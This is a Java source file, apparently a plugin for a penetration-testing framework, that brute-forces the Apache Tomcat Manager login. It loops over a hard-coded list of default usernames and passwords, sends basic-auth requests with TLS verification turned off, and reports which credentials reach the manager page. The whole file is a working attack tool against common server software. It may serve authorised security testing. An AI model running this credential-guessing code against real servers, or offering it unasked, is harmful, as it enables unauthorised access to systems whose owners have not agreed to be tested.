package me.gv7.woodpecker.vuldb.weak_password.exploit;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.vuldb.CVE_2017_12615.CVE_2017_12615_Plugin;
import me.gv7.woodpecker.vuldb.CVE_2020_1938.CVE_2020_1938_Plugin;
import me.gv7.woodpecker.vuldb.weak_password.WeakPasswordCrackPlugin;
import net.dongliu.requests.RawResponse;
import net.dongliu.requests.Requests;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class WeakPasswordCrack implements IExploit {

    String[] flag_array = new String[]{"/manager/html/reload", "Tomcat Web Application Manager"};

    static Map<String,String[]> basicAuthMap = new HashMap<String, String[]>();

    static {
        basicAuthMap.put("tomcat",new String[]{"tomcat", "123456", "11111", ""});
        basicAuthMap.put("admin",new String[]{"admin", "123456","password",""});
        basicAuthMap.put("manager",new String[]{"manager", "123456", "tomcat", "s3cret"});
        basicAuthMap.put("root",new String[]{"root", "123456", "admin"});
    }

    public String getExploitTabCaption() {
        return "Crack";
    }

    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder argsUsageBinder = WeakPasswordCrackPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        final IArg url = CVE_2020_1938_Plugin.pluginHelper.createArg();
        url.setName("url");
        url.setDefaultValue("http://127.0.0.1:8080/manager/html");
        url.setRequired(true);
        url.setDescription("url");
        args.add(url);


        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doExploit(ITarget target, Map<String, Object> customArgs, IResultOutput result) {
        String url = (String)customArgs.get("url");
        for (Map.Entry<String, String[]> entry:basicAuthMap.entrySet()){
            String username = entry.getKey();
            for (String password:entry.getValue()){
                RawResponse response = Requests.get(url).basicAuth(username, password).verify(false).send();
                if(response.statusCode() == 404) {
                    String msg = String.format("%s is 404", url);
                    result.infoPrintln(msg);
                }else if(response.statusCode() == 401 || response.getStatusCode() == 403){
                    String msg = String.format("username:[%s],password:[%s] error status:[%d]",username,password,response.getStatusCode());
                    result.infoPrintln(msg);
                }else{
                    String respBody = response.readToText();
                    // 判断返回内容是否有关键字
                    for(String flag:flag_array){
                        if(respBody.contains(flag)){
                            String msg = String.format("username:[%s],password:[%s],response include flag:[%s]",username,password,flag);
                            result.infoPrintln(msg);
                        }else{
                            String msg = String.format("username:[%s],password:[%s],response not include flag",username,password);
                            result.infoPrintln(msg);
                        }
                    }
                }
            }

        }
    }
}
